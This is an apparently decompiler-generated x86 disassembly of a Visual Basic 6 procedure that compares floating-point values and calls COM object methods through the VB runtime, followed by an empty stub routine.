00880505: mov var_64, eax
00880508: jmp 88050Eh
0088050A: and var_64, 00000000h
0088050E: fld real4 ptr var_2C
00880511: fcomp real4 ptr var_30
00880514: fstsw ax
00880516: sahf 
00880517: jnb 880522h
00880519: mov var_68, 00000001h
00880520: jmp 880526h
00880522: and var_68, 00000000h
00880526: mov eax, var_68
00880529: neg eax
0088052B: mov var_40, ax
0088052F: lea ecx, var_24
00880532: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880537: movsx eax, word ptr var_40
0088053B: test eax, eax
0088053D: jz 008806A6h
00880543: mov var_04, 00000005h
0088054A: lea eax, var_30
0088054D: push eax
0088054E: mov eax, var_48
00880551: mov eax, [eax]
00880553: push var_48
00880556: call [eax+00000080h]
0088055C: fclex 
0088055E: mov var_34, eax
00880561: cmp var_34, 00000000h
00880565: jnl 880581h
00880567: push 00000080h
0088056C: push 00440EDCh
00880571: push var_48
00880574: push var_34
00880577: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088057C: mov var_6C, eax
0088057F: jmp 880585h
00880581: and var_6C, 00000000h
00880585: mov eax, [ebp+08h]
00880588: mov eax, [eax]
0088058A: push [ebp+08h]
0088058D: call [eax+00000328h]
00880593: push eax
00880594: lea eax, var_24
00880597: push eax
00880598: call 00410A84h ; Set (object)
0088059D: mov var_38, eax
008805A0: lea eax, var_2C
008805A3: push eax
008805A4: mov eax, var_38
008805A7: mov eax, [eax]
008805A9: push var_38
008805AC: call [eax+00000080h]
008805B2: fclex 
008805B4: mov var_3C, eax
008805B7: cmp var_3C, 00000000h
008805BB: jnl 8805D7h
008805BD: push 00000080h
008805C2: push 00440EDCh
008805C7: push var_38
008805CA: push var_3C
008805CD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008805D2: mov var_70, eax
008805D5: jmp 8805DBh
008805D7: and var_70, 00000000h
008805DB: fld real4 ptr var_2C
008805DE: fsub real4 ptr var_30
008805E1: cmp [008F2000h], 00000000h
008805E8: jnz 8805F2h
008805EA: fdiv real4 ptr [00402B64h]
008805F0: jmp 8805FDh
008805F2: push [00402B64h]
008805F8: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
008805FD: fstsw ax
008805FF: test al, 0Dh
00880601: jnz 00880F94h
00880607: push ecx
00880608: fstp real4 ptr [esp]
0088060B: mov eax, var_48
0088060E: mov eax, [eax]
00880610: push var_48
00880613: call [eax+74h]
00880616: fclex 
00880618: mov var_40, eax
0088061B: cmp var_40, 00000000h
0088061F: jnl 880638h
00880621: push 00000074h
00880623: push 00440EDCh
00880628: push var_48
0088062B: push var_40
0088062E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880633: mov var_74, eax
00880636: jmp 88063Ch
00880638: and var_74, 00000000h
0088063C: lea ecx, var_24
0088063F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880644: mov var_04, 00000006h
0088064B: mov eax, [ebp+08h]
0088064E: mov eax, [eax]
00880650: push [ebp+08h]
00880653: call [eax+0000032Ch]
00880659: push eax
0088065A: lea eax, var_24
0088065D: push eax
0088065E: call 00410A84h ; Set (object)
00880663: mov var_34, eax
00880666: push 00000000h
00880668: mov eax, var_34
0088066B: mov eax, [eax]
0088066D: push var_34
00880670: call [eax+7Ch]
00880673: fclex 
00880675: mov var_38, eax
00880678: cmp var_38, 00000000h
0088067C: jnl 880695h
0088067E: push 0000007Ch
00880680: push 00457C24h
00880685: push var_34
00880688: push var_38
0088068B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880690: mov var_78, eax
00880693: jmp 880699h
00880695: and var_78, 00000000h
00880699: lea ecx, var_24
0088069C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008806A1: jmp 0088095Ch
008806A6: mov var_04, 00000008h
008806AD: mov eax, [ebp+08h]
008806B0: mov eax, [eax]
008806B2: push [ebp+08h]
008806B5: call [eax+0000032Ch]
008806BB: push eax
008806BC: lea eax, var_24
008806BF: push eax
008806C0: call 00410A84h ; Set (object)
008806C5: mov var_34, eax
008806C8: push 00000000h
008806CA: mov eax, var_34
008806CD: mov eax, [eax]
008806CF: push var_34
008806D2: call [eax+0000009Ch]
008806D8: fclex 
008806DA: mov var_38, eax
008806DD: cmp var_38, 00000000h
008806E1: jnl 8806FDh
008806E3: push 0000009Ch
008806E8: push 00457C24h
008806ED: push var_34
008806F0: push var_38
008806F3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008806F8: mov var_7C, eax
008806FB: jmp 880701h
008806FD: and var_7C, 00000000h
00880701: lea ecx, var_24
00880704: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880709: mov var_04, 00000009h
00880710: mov eax, [ebp+08h]
00880713: mov eax, [eax]
00880715: push [ebp+08h]
00880718: call [eax+00000328h]
0088071E: push eax
0088071F: lea eax, var_24
00880722: push eax
00880723: call 00410A84h ; Set (object)
00880728: mov var_34, eax
0088072B: lea eax, var_30
0088072E: push eax
0088072F: mov eax, var_34
00880732: mov eax, [eax]
00880734: push var_34
00880737: call [eax+00000080h]
0088073D: fclex 
0088073F: mov var_38, eax
00880742: cmp var_38, 00000000h
00880746: jnl 880762h
00880748: push 00000080h
0088074D: push 00440EDCh
00880752: push var_34
00880755: push var_38
00880758: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088075D: mov var_80, eax
00880760: jmp 880766h
00880762: and var_80, 00000000h
00880766: mov eax, [ebp+08h]
00880769: mov eax, [eax]
0088076B: push [ebp+08h]
0088076E: call [eax+0000032Ch]
00880774: push eax
00880775: lea eax, var_28
00880778: push eax
00880779: call 00410A84h ; Set (object)
0088077E: mov var_40, eax
00880781: lea eax, var_2C
00880784: push eax
00880785: mov eax, var_48
00880788: mov eax, [eax]
0088078A: push var_48
0088078D: call [eax+00000080h]
00880793: fclex 
00880795: mov var_3C, eax
00880798: cmp var_3C, 00000000h
0088079C: jnl 8807BBh
0088079E: push 00000080h
008807A3: push 00440EDCh
008807A8: push var_48
008807AB: push var_3C
008807AE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008807B3: mov var_00000084, eax
008807B9: jmp 8807C2h
008807BB: and var_00000084, 00000000h
008807C2: fld real4 ptr var_2C
008807C5: fsub real4 ptr var_30
008807C8: fstsw ax
008807CA: test al, 0Dh
008807CC: jnz 00880F94h
008807D2: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008807D7: push eax
008807D8: mov eax, var_40
008807DB: mov eax, [eax]
008807DD: push var_40
008807E0: call [eax+000000A4h]
008807E6: fclex 
008807E8: mov var_44, eax
008807EB: cmp var_44, 00000000h
008807EF: jnl 88080Eh
008807F1: push 000000A4h
008807F6: push 00457C24h
008807FB: push var_40
008807FE: push var_44
00880801: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880806: mov var_00000088, eax
0088080C: jmp 880815h
0088080E: and var_00000088, 00000000h
00880815: lea eax, var_28
00880818: push eax
00880819: lea eax, var_24
0088081C: push eax
0088081D: push 00000002h
0088081F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00880824: add esp, 0000000Ch
00880827: mov var_04, 0000000Ah
0088082E: mov eax, [ebp+08h]
00880831: mov eax, [eax]
00880833: push [ebp+08h]
00880836: call [eax+0000032Ch]
0088083C: push eax
0088083D: lea eax, var_24
00880840: push eax
00880841: call 00410A84h ; Set (object)
00880846: mov var_34, eax
00880849: push 00000001h
0088084B: mov eax, var_34
0088084E: mov eax, [eax]
00880850: push var_34
00880853: call [eax+000000ACh]
00880859: fclex 
0088085B: mov var_38, eax
0088085E: cmp var_38, 00000000h
00880862: jnl 880881h
00880864: push 000000ACh
00880869: push 00457C24h
0088086E: push var_34
00880871: push var_38
00880874: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880879: mov var_0000008C, eax
0088087F: jmp 880888h
00880881: and var_0000008C, 00000000h
00880888: lea ecx, var_24
0088088B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880890: mov var_04, 0000000Bh
00880897: mov eax, [ebp+08h]
0088089A: mov eax, [eax]
0088089C: push [ebp+08h]
0088089F: call [eax+0000032Ch]
008808A5: push eax
008808A6: lea eax, var_24
008808A9: push eax
008808AA: call 00410A84h ; Set (object)
008808AF: mov var_34, eax
008808B2: push 0000000Ah
008808B4: mov eax, var_34
008808B7: mov eax, [eax]
008808B9: push var_34
008808BC: call [eax+000000B4h]
008808C2: fclex 
008808C4: mov var_38, eax
008808C7: cmp var_38, 00000000h
008808CB: jnl 8808EAh
008808CD: push 000000B4h
008808D2: push 00457C24h
008808D7: push var_34
008808DA: push var_38
008808DD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008808E2: mov var_00000090, eax
008808E8: jmp 8808F1h
008808EA: and var_00000090, 00000000h
008808F1: lea ecx, var_24
008808F4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008808F9: mov var_04, 0000000Ch
00880900: mov eax, [ebp+08h]
00880903: mov eax, [eax]
00880905: push [ebp+08h]
00880908: call [eax+0000032Ch]
0088090E: push eax
0088090F: lea eax, var_24
00880912: push eax
00880913: call 00410A84h ; Set (object)
00880918: mov var_34, eax
0088091B: push FFFFFFFFh
0088091D: mov eax, var_34
00880920: mov eax, [eax]
00880922: push var_34
00880925: call [eax+7Ch]
00880928: fclex 
0088092A: mov var_38, eax
0088092D: cmp var_38, 00000000h
00880931: jnl 88094Dh
00880933: push 0000007Ch
00880935: push 00457C24h
0088093A: push var_34
0088093D: push var_38
00880940: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880945: mov var_00000094, eax
0088094B: jmp 880954h
0088094D: and var_00000094, 00000000h
00880954: lea ecx, var_24
00880957: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0088095C: mov var_04, 0000000Eh
00880963: mov eax, [ebp+08h]
00880966: mov eax, [eax]
00880968: push [ebp+08h]
0088096B: call [eax+00000328h]
00880971: push eax
00880972: lea eax, var_24
00880975: push eax
00880976: call 00410A84h ; Set (object)
0088097B: mov var_34, eax
0088097E: lea eax, var_30
00880981: push eax
00880982: mov eax, var_34
00880985: mov eax, [eax]
00880987: push var_34
0088098A: call [eax+00000110h]
00880990: fclex 
00880992: mov var_38, eax
00880995: cmp var_38, 00000000h
00880999: jnl 8809B8h
0088099B: push 00000110h
008809A0: push 00440EDCh
008809A5: push var_34
008809A8: push var_38
008809AB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008809B0: mov var_00000098, eax
008809B6: jmp 8809BFh
008809B8: and var_00000098, 00000000h
008809BF: lea eax, var_2C
008809C2: push eax
008809C3: mov eax, var_48
008809C6: mov eax, [eax]
008809C8: push var_48
008809CB: call [eax+00000110h]
008809D1: fclex 
008809D3: mov var_3C, eax
008809D6: cmp var_3C, 00000000h
008809DA: jnl 8809F9h
008809DC: push 00000110h
008809E1: push 00440EDCh
008809E6: push var_48
008809E9: push var_3C
008809EC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008809F1: mov var_0000009C, eax
008809F7: jmp 880A00h
008809F9: and var_0000009C, 00000000h
00880A00: fld real4 ptr var_2C
00880A03: fcomp real4 ptr var_30
00880A06: fstsw ax
00880A08: sahf 
00880A09: jnb 880A17h
00880A0B: mov var_000000A0, 00000001h
00880A15: jmp 880A1Eh
00880A17: and var_000000A0, 00000000h
00880A1E: mov eax, var_000000A0
00880A24: neg eax
00880A26: mov var_40, ax
00880A2A: lea ecx, var_24
00880A2D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880A32: movsx eax, word ptr var_40
00880A36: test eax, eax
00880A38: jz 00880BB9h
00880A3E: mov var_04, 0000000Fh
00880A45: lea eax, var_30
00880A48: push eax
00880A49: mov eax, var_48
00880A4C: mov eax, [eax]
00880A4E: push var_48
00880A51: call [eax+00000088h]
00880A57: fclex 
00880A59: mov var_34, eax
00880A5C: cmp var_34, 00000000h
00880A60: jnl 880A7Fh
00880A62: push 00000088h
00880A67: push 00440EDCh
00880A6C: push var_48
00880A6F: push var_34
00880A72: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880A77: mov var_000000A4, eax
00880A7D: jmp 880A86h
00880A7F: and var_000000A4, 00000000h
00880A86: mov eax, [ebp+08h]
00880A89: mov eax, [eax]
00880A8B: push [ebp+08h]
00880A8E: call [eax+00000328h]
00880A94: push eax
00880A95: lea eax, var_24
00880A98: push eax
00880A99: call 00410A84h ; Set (object)
00880A9E: mov var_38, eax
00880AA1: lea eax, var_2C
00880AA4: push eax
00880AA5: mov eax, var_38
00880AA8: mov eax, [eax]
00880AAA: push var_38
00880AAD: call [eax+00000088h]
00880AB3: fclex 
00880AB5: mov var_3C, eax
00880AB8: cmp var_3C, 00000000h
00880ABC: jnl 880ADBh
00880ABE: push 00000088h
00880AC3: push 00440EDCh
00880AC8: push var_38
00880ACB: push var_3C
00880ACE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880AD3: mov var_000000A8, eax
00880AD9: jmp 880AE2h
00880ADB: and var_000000A8, 00000000h
00880AE2: fld real4 ptr var_2C
00880AE5: fsub real4 ptr var_30
00880AE8: cmp [008F2000h], 00000000h
00880AEF: jnz 880AF9h
00880AF1: fdiv real4 ptr [00402B64h]
00880AF7: jmp 880B04h
00880AF9: push [00402B64h]
00880AFF: call 004106B8h ; msvbvm60.dll._adj_fdiv_m32
00880B04: fstsw ax
00880B06: test al, 0Dh
00880B08: jnz 00880F94h
00880B0E: push ecx
00880B0F: fstp real4 ptr [esp]
00880B12: mov eax, var_48
00880B15: mov eax, [eax]
00880B17: push var_48
00880B1A: call [eax+7Ch]
00880B1D: fclex 
00880B1F: mov var_40, eax
00880B22: cmp var_40, 00000000h
00880B26: jnl 880B42h
00880B28: push 0000007Ch
00880B2A: push 00440EDCh
00880B2F: push var_48
00880B32: push var_40
00880B35: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880B3A: mov var_000000AC, eax
00880B40: jmp 880B49h
00880B42: and var_000000AC, 00000000h
00880B49: lea ecx, var_24
00880B4C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880B51: mov var_04, 00000010h
00880B58: mov eax, [ebp+08h]
00880B5B: mov eax, [eax]
00880B5D: push [ebp+08h]
00880B60: call [eax+00000330h]
00880B66: push eax
00880B67: lea eax, var_24
00880B6A: push eax
00880B6B: call 00410A84h ; Set (object)
00880B70: mov var_34, eax
00880B73: push 00000000h
00880B75: mov eax, var_34
00880B78: mov eax, [eax]
00880B7A: push var_34
00880B7D: call [eax+7Ch]
00880B80: fclex 
00880B82: mov var_38, eax
00880B85: cmp var_38, 00000000h
00880B89: jnl 880BA5h
00880B8B: push 0000007Ch
00880B8D: push 00457C34h
00880B92: push var_34
00880B95: push var_38
00880B98: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880B9D: mov var_000000B0, eax
00880BA3: jmp 880BACh
00880BA5: and var_000000B0, 00000000h
00880BAC: lea ecx, var_24
00880BAF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880BB4: jmp 00880EE4h
00880BB9: mov var_04, 00000012h
00880BC0: mov eax, [ebp+08h]
00880BC3: mov eax, [eax]
00880BC5: push [ebp+08h]
00880BC8: call [eax+00000330h]
00880BCE: push eax
00880BCF: lea eax, var_24
00880BD2: push eax
00880BD3: call 00410A84h ; Set (object)
00880BD8: mov var_34, eax
00880BDB: push 00000000h
00880BDD: mov eax, var_34
00880BE0: mov eax, [eax]
00880BE2: push var_34
00880BE5: call [eax+0000009Ch]
00880BEB: fclex 
00880BED: mov var_38, eax
00880BF0: cmp var_38, 00000000h
00880BF4: jnl 880C13h
00880BF6: push 0000009Ch
00880BFB: push 00457C34h
00880C00: push var_34
00880C03: push var_38
00880C06: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880C0B: mov var_000000B4, eax
00880C11: jmp 880C1Ah
00880C13: and var_000000B4, 00000000h
00880C1A: lea ecx, var_24
00880C1D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880C22: mov var_04, 00000013h
00880C29: mov eax, [ebp+08h]
00880C2C: mov eax, [eax]
00880C2E: push [ebp+08h]
00880C31: call [eax+00000328h]
00880C37: push eax
00880C38: lea eax, var_24
00880C3B: push eax
00880C3C: call 00410A84h ; Set (object)
00880C41: mov var_34, eax
00880C44: lea eax, var_30
00880C47: push eax
00880C48: mov eax, var_34
00880C4B: mov eax, [eax]
00880C4D: push var_34
00880C50: call [eax+00000088h]
00880C56: fclex 
00880C58: mov var_38, eax
00880C5B: cmp var_38, 00000000h
00880C5F: jnl 880C7Eh
00880C61: push 00000088h
00880C66: push 00440EDCh
00880C6B: push var_34
00880C6E: push var_38
00880C71: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880C76: mov var_000000B8, eax
00880C7C: jmp 880C85h
00880C7E: and var_000000B8, 00000000h
00880C85: mov eax, [ebp+08h]
00880C88: mov eax, [eax]
00880C8A: push [ebp+08h]
00880C8D: call [eax+00000330h]
00880C93: push eax
00880C94: lea eax, var_28
00880C97: push eax
00880C98: call 00410A84h ; Set (object)
00880C9D: mov var_40, eax
00880CA0: lea eax, var_2C
00880CA3: push eax
00880CA4: mov eax, var_48
00880CA7: mov eax, [eax]
00880CA9: push var_48
00880CAC: call [eax+00000088h]
00880CB2: fclex 
00880CB4: mov var_3C, eax
00880CB7: cmp var_3C, 00000000h
00880CBB: jnl 880CDAh
00880CBD: push 00000088h
00880CC2: push 00440EDCh
00880CC7: push var_48
00880CCA: push var_3C
00880CCD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880CD2: mov var_000000BC, eax
00880CD8: jmp 880CE1h
00880CDA: and var_000000BC, 00000000h
00880CE1: fld real4 ptr var_2C
00880CE4: fsub real4 ptr var_30
00880CE7: fstsw ax
00880CE9: test al, 0Dh
00880CEB: jnz 00880F94h
00880CF1: call 004108E6h ; msvbvm60.dll.__vbaFpI2
00880CF6: push eax
00880CF7: mov eax, var_40
00880CFA: mov eax, [eax]
00880CFC: push var_40
00880CFF: call [eax+000000A4h]
00880D05: fclex 
00880D07: mov var_44, eax
00880D0A: cmp var_44, 00000000h
00880D0E: jnl 880D2Dh
00880D10: push 000000A4h
00880D15: push 00457C34h
00880D1A: push var_40
00880D1D: push var_44
00880D20: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880D25: mov var_000000C0, eax
00880D2B: jmp 880D34h
00880D2D: and var_000000C0, 00000000h
00880D34: lea eax, var_28
00880D37: push eax
00880D38: lea eax, var_24
00880D3B: push eax
00880D3C: push 00000002h
00880D3E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00880D43: add esp, 0000000Ch
00880D46: mov var_04, 00000014h
00880D4D: mov eax, [ebp+08h]
00880D50: mov eax, [eax]
00880D52: push [ebp+08h]
00880D55: call [eax+00000330h]
00880D5B: push eax
00880D5C: lea eax, var_24
00880D5F: push eax
00880D60: call 00410A84h ; Set (object)
00880D65: mov var_34, eax
00880D68: push 00000001h
00880D6A: mov eax, var_34
00880D6D: mov eax, [eax]
00880D6F: push var_34
00880D72: call [eax+000000ACh]
00880D78: fclex 
00880D7A: mov var_38, eax
00880D7D: cmp var_38, 00000000h
00880D81: jnl 880DA0h
00880D83: push 000000ACh
00880D88: push 00457C34h
00880D8D: push var_34
00880D90: push var_38
00880D93: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880D98: mov var_000000C4, eax
00880D9E: jmp 880DA7h
00880DA0: and var_000000C4, 00000000h
00880DA7: lea ecx, var_24
00880DAA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880DAF: mov var_04, 00000015h
00880DB6: mov eax, [ebp+08h]
00880DB9: mov eax, [eax]
00880DBB: push [ebp+08h]
00880DBE: call [eax+00000330h]
00880DC4: push eax
00880DC5: lea eax, var_24
00880DC8: push eax
00880DC9: call 00410A84h ; Set (object)
00880DCE: mov var_34, eax
00880DD1: push 0000000Ah
00880DD3: mov eax, var_34
00880DD6: mov eax, [eax]
00880DD8: push var_34
00880DDB: call [eax+000000B4h]
00880DE1: fclex 
00880DE3: mov var_38, eax
00880DE6: cmp var_38, 00000000h
00880DEA: jnl 880E09h
00880DEC: push 000000B4h
00880DF1: push 00457C34h
00880DF6: push var_34
00880DF9: push var_38
00880DFC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880E01: mov var_000000C8, eax
00880E07: jmp 880E10h
00880E09: and var_000000C8, 00000000h
00880E10: lea ecx, var_24
00880E13: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880E18: mov var_04, 00000016h
00880E1F: mov eax, [ebp+08h]
00880E22: mov eax, [eax]
00880E24: push [ebp+08h]
00880E27: call [eax+00000330h]
00880E2D: push eax
00880E2E: lea eax, var_24
00880E31: push eax
00880E32: call 00410A84h ; Set (object)
00880E37: mov var_34, eax
00880E3A: push 00000000h
00880E3C: mov eax, var_34
00880E3F: mov eax, [eax]
00880E41: push var_34
00880E44: call [eax+000000BCh]
00880E4A: fclex 
00880E4C: mov var_38, eax
00880E4F: cmp var_38, 00000000h
00880E53: jnl 880E72h
00880E55: push 000000BCh
00880E5A: push 00457C34h
00880E5F: push var_34
00880E62: push var_38
00880E65: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880E6A: mov var_000000CC, eax
00880E70: jmp 880E79h
00880E72: and var_000000CC, 00000000h
00880E79: lea ecx, var_24
00880E7C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880E81: mov var_04, 00000017h
00880E88: mov eax, [ebp+08h]
00880E8B: mov eax, [eax]
00880E8D: push [ebp+08h]
00880E90: call [eax+00000330h]
00880E96: push eax
00880E97: lea eax, var_24
00880E9A: push eax
00880E9B: call 00410A84h ; Set (object)
00880EA0: mov var_34, eax
00880EA3: push FFFFFFFFh
00880EA5: mov eax, var_34
00880EA8: mov eax, [eax]
00880EAA: push var_34
00880EAD: call [eax+7Ch]
00880EB0: fclex 
00880EB2: mov var_38, eax
00880EB5: cmp var_38, 00000000h
00880EB9: jnl 880ED5h
00880EBB: push 0000007Ch
00880EBD: push 00457C34h
00880EC2: push var_34
00880EC5: push var_38
00880EC8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880ECD: mov var_000000D0, eax
00880ED3: jmp 880EDCh
00880ED5: and var_000000D0, 00000000h
00880EDC: lea ecx, var_24
00880EDF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880EE4: mov var_04, 00000019h
00880EEB: push 00000000h
00880EED: lea eax, var_48
00880EF0: push eax
00880EF1: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
00880EF6: mov var_04, 0000001Ah
00880EFD: mov eax, [ebp+08h]
00880F00: mov eax, [eax]
00880F02: push [ebp+08h]
00880F05: call [eax+000002FCh]
00880F0B: push eax
00880F0C: lea eax, var_24
00880F0F: push eax
00880F10: call 00410A84h ; Set (object)
00880F15: mov var_34, eax
00880F18: fldz 
00880F1A: push ecx
00880F1B: fstp real4 ptr [esp]
00880F1E: mov eax, var_34
00880F21: mov eax, [eax]
00880F23: push var_34
00880F26: call [eax+74h]
00880F29: fclex 
00880F2B: mov var_38, eax
00880F2E: cmp var_38, 00000000h
00880F32: jnl 880F4Eh
00880F34: push 00000074h
00880F36: push 00440EDCh
00880F3B: push var_34
00880F3E: push var_38
00880F41: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00880F46: mov var_000000D4, eax
00880F4C: jmp 880F55h
00880F4E: and var_000000D4, 00000000h
00880F55: lea ecx, var_24
00880F58: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00880F5D: wait 
00880F5E: push 00880F81h
00880F63: jmp 880F78h
00880F65: lea eax, var_28
00880F68: push eax
00880F69: lea eax, var_24
00880F6C: push eax
00880F6D: push 00000002h
00880F6F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00880F74: add esp, 0000000Ch
00880F77: ret 
End Sub

Private sub unknown_8B29DD
008B29DD: push ebp
008B29DE: mov ebp, esp
008B29E0: xor eax, eax
008B29E2: pop ebp
008B29E3: retn 0004h
End Sub

